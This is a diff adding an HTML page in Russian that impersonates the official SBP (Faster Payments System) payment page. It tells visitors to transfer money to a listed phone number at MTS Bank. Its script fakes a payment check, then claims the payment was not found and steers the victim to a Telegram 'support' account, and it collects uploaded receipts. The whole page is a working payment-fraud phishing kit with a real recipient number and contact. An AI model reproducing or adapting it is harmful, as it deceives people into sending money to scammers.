@@ -1,0 +1,385 @@
+<!DOCTYPE html><html lang="ru-RU"><head>
+	<meta charset="UTF-8">
+	<meta name="robots" content="noindex, nofollow">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta content="true" name="HandheldFriendly">
+	<meta content="width" name="MobileOptimized">
+	<meta content="yes" name="apple-mobile-web-app-capable">
+
+	<title>Система быстрых платежей - Оплата по QR коду</title>
+	<link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+	<link rel="stylesheet" href="css/bootstrap-icons.css" crossorigin="anonymous">
+	<link rel="stylesheet" type="text/css" href="css/main.css">
+	<link rel="stylesheet" type="text/css" href="css/index.css">
+	<link rel="stylesheet" type="text/css" href="css/style.css">
+	<link rel="stylesheet" type="text/css" href="css/form.css">
+	<link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+	<style>
+		.banks__list-wrap:before,
+		.banks__list-wrap:after {
+			background: transparent !important;
+		}
+
+		.content__mobile {
+			height: unset !important;
+		}
+	</style>
+	<script type="text/javascript" charset="utf-8" async="" src="js/loader.js"></script><script>
+		var upload = 0;
+	</script>
+
+    <!-- <script type="text/javascript">
+        var _smartsupp = _smartsupp || {};
+        _smartsupp.key = '34562773f202a5d6359d7c1c8393b3dd044fbf30';
+        window.smartsupp||(function(d) {
+            var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
+            s=d.getElementsByTagName('script')[0];c=d.createElement('script');
+            c.type='text/javascript';c.charset='utf-8';c.async=true;
+            c.src='https://www.smartsuppchat.com/loader.js?';s.parentNode.insertBefore(c,s);
+        })(document);
+    </script> -->
+	
+		  <script defer="" src="/js/function.js"></script>
+			<script defer="" src="./js/totalPrice.js"></script>
+</head>
+
+<body class="home home-page loading is-mobile loaded">
+	<div class="preloader"></div>
+
+	<div class="main main--no-summ">
+		<header class="page-header" style="top: -103px;">
+			<div class="logo-sbp">
+				<img src="images/logo.svg" alt="СБП Системы Быстрых Платежей">
+			</div>
+			<div class="link">
+				<a href="https://sbp.nspk.ru/">sbp.nspk.ru</a>
+			</div>
+		</header>
+
+		<div class="content" style="max-width: 700px;">
+			<div class="content__mobile">
+				 <!-- <section class="banks">
+					<div class="banks__list-wrap" style="top: 544px;padding: 15px;font-size: 15px;font-weight: 400;">
+						В связи с большой нагрузкой в банковской системе, оплата картой временно недоступна. Произведите оплату по системе быстрых платежей "СБП". Приносим свои извинения!
+					</div> -->
+				
+				<section class="info-sum" style="display: flex;">
+					<div class="info-sum__text-sum" >Сумма</div>
+					<div class="info-sum__sum" id="booking-submit-summary"></div><span ></span>
+					<!-- ₽₽ или ₽-->
+					<div class="anistripe">
+						<div class="i1"></div>
+						<div class="i2"></div>
+						<div class="i3"></div>
+						<div class="i4"></div>
+						<div class="i5"></div>
+						<div class="i6"></div>
+						<div class="i7"></div>
+						<div class="i8"></div>
+						<div class="i1"></div>
+					</div>
+				</section>
+
+				<section class="info-sum info-sum--no-sum">
+					<div class="info-sum__text">Произведите оплату по реквизитам</div>
+				</section>
+				
+				<section>
+					<div class="alert alert-danger alert-dismissible fade mt-5 hide" role="alert" style="font-size: 16px;">
+						<strong>Ошибка!</strong>
+						<div class="fw-normal error-msg"></div>
+						<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close" style="font-size: 12px;"></button>
+					</div>
+					<div class="alert alert-primary alert-dismissible fade mt-5 hide" role="alert" style="font-size: 16px;">
+						<strong>Внимание!</strong>
+						<div class="fw-normal alert-msg"></div>
+						<!-- <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close" style="font-size: 12px;"></button> -->
+					</div>
+										<a href="#howto" id="howpay">Как сделать перевод?</a>
+				</section>
+
+				<section class="banks">
+					<div class="banks__list-wrap" style="top: 544px;padding: 15px;">
+						<div class="table-responsive">
+							<table class="table table-borderless mb-0">
+								<tbody>
+									<!-- <tr>
+										<td>
+											<label for="" style="font-size: 16px;">1. ВЫБЕРИТЕ ВАШ БАНК:</label>
+											<select class="form-select" aria-label="Банки" id="bnks">
+												<option value="" disabled selected>Выбрать</option>
+												<option value="bank100000000111://|https://online.sberbank.ru/">Сбербанк</option>
+												<option value="bank100000000004://|https://www.tinkoff.ru/">Тинькофф</option>
+												<option value="bank100000000005://|https://online.vtb.ru/">ВТБ</option>
+												<option value="bank100000000008://|https://alfabank.ru/">Альфа-Банк</option>
+												<option value="bank100000000007://|https://online.raiffeisen.ru/">Райффайзен Банк</option>
+												<option value="bank100000000015://|https://ib.open.ru/webbank/#/">Открытие</option>
+												<option value="bank100000000001://|https://www.gazprombank.ru/">Газпромбанк</option>
+												<option value="bank100000000010://|https://ib.psbank.ru/">Промсвязьбанк</option>
+												<option value="bank100000000013://|https://halvacard.ru/lk">Совкомбанк</option>
+												<option value="bank100000000012://|https://online.rosbank.ru/">Росбанк</option>
+												<option value="bank100000000020://|https://online.rshb.ru/">Россельхозбанк</option>
+												<option value="bank100000000025://|https://online.mkb.ru/">МКБ</option>
+												<option value="bank100000000030_new://|https://enter.unicredit.ru/">Юникредит Банк</option>
+												<option value="bank100000000017://|https://www.mtsbank.ru/">МТС-Банк</option>
+												<option value="bank100000000006://|https://online.akbars.ru/">Ак Барс Банк</option>
+												<option value="bank100000000022://|https://yoomoney.ru/">ЮМани</option>
+											</select>
+											<div class="container text-center">
+												<button class="btn btn-light mb-1 mt-2" type="button" id="openapp">Открыть приложение</button>
+												<button class="btn btn-light mb-1 mt-2" type="button" id="openweb">Открыть вебсайт</button>
+											</div>
+										</td>
+									</tr> -->
+									<tr>
+										<td>
+											<label for="" style="font-size: 16px;">1. СЧЕТ:</label>
+											<div class="copy-clipboard d-flex justify-content-between">
+												<span class="lead h4">+79966667502</span><i class="bi bi-clipboard-plus btn p-1 pt-0" data-bs-toggle="tooltip" title="Скопировать"></i>
+											</div>
+										</td>
+									</tr>
+									<tr>
+										<td>
+											<label for="" style="font-size: 16px;" >2. СУММА:</label>
+											<div class="copy-clipboard d-flex justify-content-between">
+												<span class="lead h4" id="booking-submit-summary"> ₽</span><i class="bi bi-clipboard-plus btn p-1 pt-0" data-bs-toggle="tooltip" title="Скопировать"></i>
+											</div>
+										</td>
+									</tr>
+									<tr>
+										<td>
+											<label for="" style="font-size: 16px;">3. БАНК ПОЛУЧАТЕЛЬ:</label>
+											<div class="copy-clipboard d-flex justify-content-between">
+												<span class="lead h4">МТС Банк</span>
+											</div>
+										</td>
+									</tr>
+								</tbody>
+							</table>
+						</div>
+						<div class="container text-center d-grid gap-2 col-6 mx-auto">
+							<button class="btn btn-primary mb-1 btn-lg" type="button" id="submitForm">Подтвердить оплату</button>
+							<a href="https://t.me/Sergey_supp_spb_nspk">
+								<button class="btn btn-primary mb-1 btn-lg" type="button" id="uploadForm" data-bs-toggle="modal" data-bs-target="#acceptInv" style="display: none;">Техподдержка </button>
+
+							</a>
+						</div>
+						<span class="footnote"><sup style="font-family: sans-serif; font-weight: 200 !important;">*</sup>Продавец получит денежный перевод после подтверждения получения Вами товара.</span>						<div class="modal fade" id="acceptInv" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="acceptInvLabel" aria-hidden="true">
+							<div class="modal-dialog modal-dialog-centered">
+								<div class="modal-content">
+								<div class="modal-header">
+									<h5 class="modal-title" id="acceptInvLabel">Подтверждение оплаты</h5>
+									<button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+								</div>
+								<div class="modal-body">
+									<div class="mb-3">
+										<label for="formFile" class="form-label fs-6 fw-normal">Загрузите квитанцию об оплате</label>
+										<form id="data" method="post" enctype="multipart/form-data">
+											<input type="hidden" name="order" value="31599967">
+											<input name="file" class="form-control" type="file" id="formFile" accept=".doc,.pdf,.jpg,.png">
+										</form>
+									</div>
+								</div>
+								<div class="modal-footer">
+									<button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Отмена</button>
+									<button type="button" class="btn btn-primary" id="upload">Загрузить</button>
+								</div>
+								</div>
+							</div>
+						</div>
+					</div>
+
+				</section>
+				
+				<!-- <section class="banks">
+					<div class="banks__list-wrap" style="top: 544px;padding: 15px;font-size: 15px;font-weight: 400;">
+					<div class="info-sum__text" style="font-size: 16px;">Как оплатить через систему быстрых платежей?</div>
+						<ol>
+							<li>Выберите свой банк и откройте приложение или перейдите в веб версию банка</li>
+							<li>Найдите систему быстрых платежей</li>
+							<li>Скопируйте все реквизиты</li>
+							<li>Совершите перевод</li>
+							<li>Сохраните квитанцию</li>
+							<li>Подтвердите оплату кнопкой "Я оплатил" и загрузите квитанцию об оплате</li>
+						</ol>
+					</div>
+				</section> -->
+				
+				<section class="translation-instruction" id="howto">
+					<div class="content" style="overflow: hidden;">
+						<h1 class="home-page__h2" style="text-align: center;">Как сделать перевод через СБП</h1>
+						<ol class="translation-instruction__list">
+							<li class="translation-instruction__item">
+								В мобильном приложении банка выберите перевод «по номеру телефона» или «через СБП»
+							</li>
+							<li class="translation-instruction__item">
+								Введите номер телефона получателя иливыберите его из списка контактов
+							</li>
+							<li class="translation-instruction__item">
+								Если у получателя несколько карт в разных банках, выберите необходимый банк
+							</li>
+							<li class="translation-instruction__item">
+								Введите сумму, проверьте данные получателя и подтвердите перевод
+							</li>
+						</ol>
+					</div>
+			</section>
+			<section data-v-72cae6ec="" class="transfer-animation active">
+				<div data-v-72cae6ec="" class="content" style="overflow: visible;">
+					<div data-v-72cae6ec="" class="transfer-animation__wrapper">
+						<picture data-v-72cae6ec="" class="transfer-animation__send"><source data-v-72cae6ec="" srcset="images/send.png" media="(min-width: 1000px)"> <source data-v-72cae6ec="" srcset="images/send.tablet.png" media="(min-width: 450px)"> <img data-v-72cae6ec="" src="images/send.m.png" alt="Отправили"></picture>
+						<div data-v-72cae6ec="" class="transfer-animation__money"><img data-v-72cae6ec="" src="images/money.svg" alt="Деньги"> <img data-v-72cae6ec="" src="images/money1.svg" alt="Деньги"> <img data-v-72cae6ec="" src="images/money2.svg" alt="Деньги"> <img data-v-72cae6ec="" src="images/money3.svg" alt="Деньги"></div>
+						<picture data-v-72cae6ec="" class="transfer-animation__receive"><source data-v-72cae6ec="" srcset="images/receive.png" media="(min-width: 1000px)"> <source data-v-72cae6ec="" srcset="images/receive.tablet.png" media="(min-width: 450px)"> <img data-v-72cae6ec="" src="images/receive.m.png" alt="Приняли"></picture>
+					</div>
+				</div>
+			</section>
+			</div>
+		</div>
+
+		<footer class="footer">
+			<div class="footer__anistripe">
+				<div class="anistripe">
+					<div class="i1"></div>
+					<div class="i2"></div>
+					<div class="i3"></div>
+					<div class="i4"></div>
+					<div class="i5"></div>
+					<div class="i6"></div>
+					<div class="i7"></div>
+					<div class="i8"></div>
+					<div class="i1"></div>
+				</div>
+			</div>
+			<div>
+				Все платежи проводятся Системой Быстрых Платежей.
+				<br>
+				© 2024, Система Быстрых Платежей. Все права защищены.
+			</div>
+		</footer>
+
+		<section class="cookies">
+			<div>Для улучшения качества нашего сервиса мы используем на сайте технологию cookies.</div>
+			<a href="javascript:void(0);">Согласен</a>
+		</section>
+	</div>
+
+
+
+	<script src="js/jquery.min.js"></script>
+	<script src="js/toastr.min.js"></script>
+	<script>
+		$(document).ready(function() {
+			$("#openapp").click(function(){
+				var bnks = $('#bnks').val();
+				if(bnks === null) {
+					toastr.error('Вы не выбрали банк отправителя', 'Произошла ошибка');
+					return;
+				}
+				var link = bnks.split('|');
+				window.location.replace(link[0]);
+			});
+			$("#openweb").click(function(){
+				var bnks = $('#bnks').val();
+				if(bnks === null) {
+					toastr.error('Вы не выбрали банк отправителя', 'Произошла ошибка');
+					return;
+				}
+				var link = bnks.split('|');
+				window.open(link[1], '_blank');
+			});
+			$("#submitForm, #upload").click(function(e) {
+				e.preventDefault();
+				if(!upload) {
+					$('body').removeClass('loaded');
+    				setTimeout(() => { 
+    				    upload = 1;
+    					$('#submitForm').hide();
+    					$('#uploadForm').show();
+    					$('.alert-primary .alert-msg').html('Мы не смогли найти Ваш платеж в системе. Свяжитесь с нашей техподдержкой.');
+    					$('.alert-primary').removeClass('hide').addClass('show');
+    					$('body').addClass('loaded');
+    				}, 5000);
+				} else {
+					if($('#formFile').val() == '') return;
+					$('#acceptInv').modal('toggle');
+					$('body').removeClass('loaded');
+					//$('.alert-danger').removeClass('hide').addClass('show');
+					var form = $("#data");
+					var params = form.serializeArray();
+					var files = $("#formFile")[0].files;
+					var formData = new FormData();
+					formData.append('file', files[0]);
+					$(params).each(function (index, element) {
+						formData.append(element.name, element.value);
+					});
+
+					$.ajax({
+						type: 'POST',
+						url: "/sbp_check.php",
+						data: formData, 
+						processData: false,
+						contentType: false,
+						async: false,
+						cache: false,
+						dataType: "json",
+						success: function(data) {
+							if(data.status == "ok") {
+								toastr.success(data.msg, 'Успех');
+							} else if(data.status == "error") {
+								toastr.error(data.msg, 'Произошла ошибка');
+								$('body').addClass('loaded');
+							}
+						}
+					});
+					setTimeout(() => { 
+    				    upload = 1;
+    					$('#submitForm').hide();
+    					$('#uploadForm').hide();
+    					// $('.alert-primary .alert-msg').html('Обратитесь в техническую поддержку для подтверждения платежа. Чат с агентом поддержки в правом нижнем углу экрана');
+    					$('.alert-primary').removeClass('hide').addClass('show');
+    					$('body').addClass('loaded');
+                        $('.banks').hide();
+                        $("#howto").hide(); 
+			        	$( "#howpay" ).hide();
+    				}, 5000);
+				}
+			});
+		});
+	</script>
+	<script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+	<script>
+		let copyList  = document.querySelectorAll( '.copy-clipboard' );
+		let copyArray = Array.prototype.slice.call( copyList );
+
+		function tooltipUpdate( button, tooltip, title ) {
+			tooltip.dispose();
+			button.setAttribute( 'title', title );
+			tooltip = new bootstrap.Tooltip( button );
+			tooltip.show();
+
+			return tooltip;
+		}
+
+		copyArray.map( function ( copy ) {
+			let text    = copy.querySelector( 'span' ).innerText;
+			let button  = copy.querySelector( 'i' );
+			let tooltip = new bootstrap.Tooltip( button );
+
+			button.addEventListener( 'mouseover', function () {
+				tooltip = tooltipUpdate( button, tooltip, 'Скопировать' );
+				this.classList.remove( 'bi-clipboard-check' );
+				this.classList.add( 'bi-clipboard-plus' );
+			} );
+
+			button.addEventListener( 'click', function () {
+				window.navigator.clipboard.writeText( text );
+				tooltip = tooltipUpdate( button, tooltip, 'Готово!' );
+				this.classList.remove( 'bi-clipboard-plus' );
+				this.classList.add( 'bi-clipboard-check' );
+			} );
+		} );
+	</script>
+
+
+</body></html>
